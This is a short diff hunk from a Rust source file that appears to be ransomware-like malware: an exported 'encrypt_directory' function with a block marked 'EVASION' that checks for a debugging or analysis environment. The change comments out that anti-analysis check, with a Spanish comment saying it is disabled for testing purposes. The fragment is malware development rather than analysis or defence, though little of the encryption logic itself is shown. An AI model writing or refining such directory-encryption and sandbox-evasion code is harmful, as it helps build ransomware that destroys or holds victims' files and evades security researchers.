@@ -66,10 +66,10 @@ pub extern "C" fn encrypt_directory(path: *const c_char, max_depth: u32) -> *mut
             }
             
             // EVASION: Check for debugging/analysis environment
-            if !evasion::should_execute() {
-                return CString::new("ERROR:Environment check failed").unwrap().into_raw();
-            }
-            
+          //  if !evasion::should_execute() {
+          //      return CString::new("ERROR:Environment check failed").unwrap().into_raw();
+          //  }
+           // desactivo esto con propositos de prueba 
             let c_str = std::ffi::CStr::from_ptr(path);
             let path_str = match c_str.to_str() {
                 Ok(s) => s,
